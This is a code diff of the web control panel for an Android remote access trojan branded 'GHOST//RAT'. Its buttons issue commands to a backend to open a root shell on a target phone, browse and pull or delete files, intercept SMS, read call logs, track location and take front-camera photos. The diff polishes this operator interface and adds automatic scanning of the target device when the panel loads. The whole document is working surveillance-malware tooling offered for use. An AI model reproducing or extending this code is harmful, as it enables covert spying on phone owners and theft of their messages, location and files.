@@ -29,7 +29,7 @@
             text-shadow: 0 0 5px currentColor;
         }
 
-        /* BOOT SCREEN — ala matrix system load */
+        /* BOOT SCREEN */
         #boot-screen {
             position: fixed;
             inset: 0;
@@ -82,7 +82,6 @@
             display: none;
         }
 
-        /* anonymous / masked header */
         .header {
             display: flex;
             flex-wrap: wrap;
@@ -113,7 +112,7 @@
         .online { color: #0f0; border-color: #0f0; }
         .offline { color: #ff4444; border-color: #ff4444; }
 
-        /* device info panel — retro */
+        /* DEVICE INFO PANEL */
         .device-panel {
             background: #0a0f0a;
             border: 1px solid #2a4a2a;
@@ -135,7 +134,7 @@
 
         .device-panel i { font-style: normal; color: #0f0; }
 
-        /* grid button dashboard — full icon vibe */
+        /* GRID BUTTONS */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
@@ -179,7 +178,7 @@
             box-shadow: 0 0 25px #0f0 !important;
         }
 
-        /* MODERN POPUP (modal) — full terminal feel */
+        /* MODALS */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -233,11 +232,7 @@
             transition: 0.2s;
         }
 
-        .close-btn:hover {
-            background: red;
-            color: black;
-            box-shadow: 0 0 20px red;
-        }
+        .close-btn:hover { background: red; color: black; box-shadow: 0 0 20px red; }
 
         .modal-body {
             flex: 1;
@@ -289,78 +284,45 @@
             box-shadow: 0 0 10px #0f0;
         }
 
-        .modal-footer button:hover {
-            background: #0f0;
-            color: black;
-        }
+        .modal-footer button:hover { background: #0f0; color: black; }
 
-        /* list device styling */
-        .device-list-item {
-            border-bottom: 1px dashed #2b5c2b;
-            padding: 10px 5px;
-            display: flex;
-            gap: 15px;
-            font-size: 1.1rem;
-        }
-
-        /* mobile friendly */
         @media (max-width: 600px) {
             .grid { grid-template-columns: repeat(2, 1fr); }
             .header h1 { font-size: 1.2rem; }
             .modal-footer input { flex: 1 1 100%; }
             .modal-footer button { width: 100%; }
         }
-
-        /* glitch anonymous effect */
-        .glitch {
-            text-shadow: -2px 0 cyan, 2px 0 red;
-            animation: glitch 0.3s infinite alternate;
-        }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 1px); }
-            40% { transform: translate(2px, -1px); }
-        }
     </style>
 </head>
 <body>
 
-<!-- BOOT SCREEN : loading bar system ala anonymous -->
 <div id="boot-screen">
     <div class="boot-anonymous">⍟⍟⍟</div>
     <div style="color:#0f0; font-size:1.5rem;">ESTABLISHING SECURE CHANNEL</div>
-    <div class="loading-bar-border">
-        <div id="loading-bar"></div>
-    </div>
+    <div class="loading-bar-border"><div id="loading-bar"></div></div>
     <p id="boot-text" style="color:#5f9ea0;">[ SYSTEM BOOT ] handshake ...</p>
     <p style="margin-top:30px; color:#2e8b57;">GHOSTSHELL // ANONYMOUS MODE</p>
 </div>
 
-<!-- MAIN DASHBOARD -->
 <div class="container" id="main-app">
     <div class="header">
-        <h1>
-            <span>⌨️ GHOST//RAT</span>
-        </h1>
+        <h1><span>⌨️ GHOST//RAT</span></h1>
         <div id="status" class="status-badge offline">OFFLINE</div>
     </div>
 
-    <!-- device panel + list device -->
     <div class="device-panel">
         <p>🖥️ <i>IP_TARGET:</i> <span id="info-ip">--.--.--.--</span></p>
-        <p>📟 <i>DEVICE:</i> <span id="info-device">unknown</span></p>
+        <p>📟 <i>DEVICE:</i> <span id="info-device">Scanning...</span></p>
         <p>🌐 <i>INTERFACE:</i> <span id="info-extra">WLAN0</span></p>
     </div>
 
-    <!-- dashboard penuh icon -->
     <div class="grid">
         <button onclick="openModal('terminal')"><i>⌨️</i> TERMINAL</button>
         <button onclick="openModal('filemanager')"><i>📁</i> FILE MANAGER</button>
         <button onclick="openModal('apps')"><i>📱</i> APPLICATIONS</button>
         <button onclick="openModal('sms')"><i>✉️</i> SMS INTERCEPT</button>
         <button onclick="openModal('calls')"><i>📞</i> CALL LOGS</button>
-        <button onclick="openModal('devices')"><i>📡</i> DEVICE LIST</button>
+        <button onclick="cmd('deviceinfo')"><i>📡</i> SCAN TARGET</button>
         <button onclick="cmd('get_location')"><i>📍</i> TRACK</button>
         <button onclick="toggleFlash()" id="flashBtn"><i>⚡</i> FLASH</button>
         <button onclick="cmd('takefrontpic')"><i>🤳</i> FRONT CAM</button>
@@ -369,24 +331,19 @@
     <div style="color:#3c5e3c; text-align:center; font-size:0.8rem; padding:8px;">[ anonymous root access ]</div>
 </div>
 
-<!-- GLOBAL MODAL (POPUP UNTUK SEMUA) -->
 <div class="modal-overlay" id="globalModal">
     <div class="modal-terminal">
         <div class="modal-header">
             <span id="modalTitle">> GHOST_TERMINAL</span>
             <span class="close-btn" onclick="closeModal()">✕</span>
         </div>
-        <div class="modal-body" id="modalOutput">
-            [CONNECTING ...]
-        </div>
-        <div class="modal-footer" id="modalFooter">
-            <!-- dynamic footer (input / button) diisi lewat js -->
-        </div>
+        <div class="modal-body" id="modalOutput">[CONNECTING ...]</div>
+        <div class="modal-footer" id="modalFooter"></div>
     </div>
 </div>
 
 <script>
-    // -------------------- BOOT SEQUENCE (loading bar) --------------------
+    // --- BOOT SEQUENCE ---
     let progress = 0;
     const bootEl = document.getElementById('boot-screen');
     const loadingBar = document.getElementById('loading-bar');
@@ -403,6 +360,7 @@
                 setTimeout(() => {
                     bootEl.style.display = 'none';
                     document.getElementById('main-app').style.display = 'block';
+                    cmd('deviceinfo'); // Auto-fetch device info on load
                 }, 600);
             }, 400);
         }
@@ -411,17 +369,16 @@
         if (progress > 65) bootText.innerText = '[ ✓ ] ESTABLISHING GHOST PROXY...';
     }, 160);
 
-    // -------------------- GLOBAL STATE --------------------
-    let currentModalType = null;   // 'filemanager', 'terminal', dll
+    // --- GLOBAL STATE ---
+    let currentModalType = null;
     let flashActive = false;
-    let lastLogCount = 0;          // untuk polling delta logs
+    let lastLogCount = 0;
 
     const modal = document.getElementById('globalModal');
     const modalTitle = document.getElementById('modalTitle');
     const modalOutput = document.getElementById('modalOutput');
     const modalFooter = document.getElementById('modalFooter');
 
-    // helper: kirim perintah ke backend (sama seperti sebelumnya)
     function cmd(command) {
         fetch('/api/command', {
             method: 'POST',
@@ -430,7 +387,6 @@
         }).catch(err => console.warn('cmd err', err));
     }
 
-    // toggle flash on/off dengan satu tombol
     function toggleFlash() {
         flashActive = !flashActive;
         const btn = document.getElementById('flashBtn');
@@ -445,36 +401,33 @@
         }
     }
 
-    // -------------------- MODAL CONTROLLER --------------------
+    // --- MODAL CONTROLLER ---
     function openModal(type) {
         currentModalType = type;
-        modalOutput.innerHTML = '';  // bersihkan
+        modalOutput.innerHTML = '<span style="color:#0f0;">[sys] Channel opened... waiting for output...</span>\n';
         modal.style.display = 'flex';
 
-        // Atur judul dan footer dinamis berdasarkan tipe
         if (type === 'terminal') {
             modalTitle.innerText = '> ROOT TERMINAL [shell]';
             modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="ls, pwd, whoami ..." autocomplete="off">
+                <input type="text" id="modalInput" placeholder="ls, pwd, whoami ..." autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
                 <button onclick="sendCommand()">EXECUTE</button>
             `;
-            // masuk ke mode shell
             cmd('shell');
-            setTimeout(() => cmd('echo [Ghost Terminal ready]'), 150);
         }
         else if (type === 'filemanager') {
             modalTitle.innerText = '> FILE MANAGER (remote fs)';
             modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="ls, cd folder, rm file, get file, put file" autocomplete="off">
+                <input type="text" id="modalInput" placeholder="ls, cd folder, rm file, get file, upload file" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
                 <button onclick="sendCommand()">RUN</button>
             `;
-            cmd('shell');          // masuk mode shell/filemanager
-            setTimeout(() => cmd('ls'), 200);
+            cmd('shell');
+            setTimeout(() => cmd('ls'), 500);
         }
         else if (type === 'apps') {
             modalTitle.innerText = '> APPLICATIONS (list & run)';
             modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="run com.whatsapp | list packages">
+                <input type="text" id="modalInput" placeholder="run com.whatsapp.name" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
                 <button onclick="sendCommand()">EXECUTE</button>
                 <button onclick="cmd('list_app')" style="background:#005500;">⟳ LIST APPS</button>
             `;
@@ -490,52 +443,42 @@
             modalFooter.innerHTML = `<button onclick="cmd('getcalllogs')" style="width:100%;">🔄 REFRESH CALLS</button>`;
             cmd('getcalllogs');
         }
-        else if (type === 'devices') {
-            modalTitle.innerText = '> DEVICE LIST (network)';
-            modalFooter.innerHTML = `<button onclick="cmd('list_devices')" style="width:100%;">⟳ SCAN NETWORK</button>`;
-            // kita bisa fetch info dari backend atau polling nanti
-            cmd('list_devices');   // asumsikan perintah ini mengembalikan daftar ip+info
-        }
-
-        // event listener untuk enter di input
+        
+        // Focus the input immediately
         setTimeout(() => {
             const inp = document.getElementById('modalInput');
-            if (inp) inp.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendCommand(); });
+            if(inp) inp.focus();
         }, 100);
     }
 
     function closeModal() {
-        // jika sedang di mode shell/filemanager, kirim exit biar backend keluar mode
         if (currentModalType === 'terminal' || currentModalType === 'filemanager') {
-            cmd('exit');       // keluar dari shell
+            cmd('exit');
+            setTimeout(() => cmd('exit_shell'), 300);
         }
         modal.style.display = 'none';
         currentModalType = null;
-        modalOutput.innerHTML = '';
     }
 
-    // fungsi untuk mengirim perintah dari input modal
     function sendCommand() {
         const inputField = document.getElementById('modalInput');
         if (!inputField) return;
         const val = inputField.value.trim();
         if (val === '') return;
 
-        // untuk get file: download secara otomatis via fetch? kita handle via backend saja, tapi di web kita bisa kasih notifikasi
         if (currentModalType === 'filemanager' && val.startsWith('get ')) {
-            modalOutput.innerHTML += `\n[⇣] initiating download: ${val} ... (file akan disimpan di server atau memicu download)\n`;
+            modalOutput.innerHTML += `\n<span style="color:#5ff0ff;">[⇣] initiating download: ${val} ... Watch your server directory!</span>\n`;
         }
-        // upload file perlu fitur khusus, tetapi bisa diarahkan via command "upload"
+        
         cmd(val);
         inputField.value = '';
     }
 
-    // -------------------- POLLING STATUS & LOGS --------------------
+    // --- POLLING & STATE UPDATES ---
     setInterval(() => {
         fetch('/api/status')
             .then(r => r.json())
             .then(data => {
-                // update header status
                 const statusEl = document.getElementById('status');
                 const ipSpan = document.getElementById('info-ip');
                 const deviceSpan = document.getElementById('info-device');
@@ -550,18 +493,15 @@
                     ipSpan.innerText = '--.--.--.--';
                 }
 
-                // update device info jika ada di log (cari kata [INFO] atau [DEVICE])
                 if (data.logs) {
+                    // Update header if [INFO] is found
                     for (let line of data.logs) {
-                        if (line.includes('[INFO]') || line.toLowerCase().includes('device:')) {
-                            deviceSpan.innerText = line.substring(line.indexOf(']')+1).trim() || 'android';
-                            break;
+                        if (line.includes('[INFO]')) {
+                            deviceSpan.innerText = line.split('[INFO]')[1].trim();
                         }
-                        // jika ada info ip tambahan dll
-                        if (line.includes('ip') && line.includes('model')) deviceSpan.innerText = line;
                     }
 
-                    // kirim log baru ke modal yg terbuka
+                    // Only append NEW logs to the active modal
                     if (currentModalType && data.logs.length > lastLogCount) {
                         const newLogs = data.logs.slice(lastLogCount);
                         let formatted = '';
@@ -571,30 +511,22 @@
                             else if (l.includes('[DOWNLOAD]')) formatted += `<span style="color:#5ff0ff;">${l}</span>\n`;
                             else formatted += l + '\n';
                         });
+                        
+                        let isScrolledToBottom = modalOutput.scrollHeight - modalOutput.clientHeight <= modalOutput.scrollTop + 5;
                         modalOutput.innerHTML += formatted;
-                        // auto-scroll
-                        modalOutput.scrollTop = modalOutput.scrollHeight;
+                        if(isScrolledToBottom) modalOutput.scrollTop = modalOutput.scrollHeight;
                     }
                     lastLogCount = data.logs.length;
                 }
             })
             .catch(() => {});
-    }, 1300);
+    }, 1200);
 
-    // fallback untuk memastikan command exit_shell jika diperlukan (tapi di close sudah ada exit)
+    // Close modal if user clicks outside of the window box
     window.onclick = function(e) {
         if (e.target === modal) closeModal();
     };
 
-    // panggil ini agar status device list bisa diisi (optional)
-    cmd('list_devices');  // polling akan menampilkan
-
-    // untuk demo, tambahkan beberapa sample logs di modal jika perlu
-    window.sendCommand = sendCommand;
-    window.openModal = openModal;
-    window.closeModal = closeModal;
-    window.cmd = cmd;
-    window.toggleFlash = toggleFlash;
 </script>
 </body>
 </html>
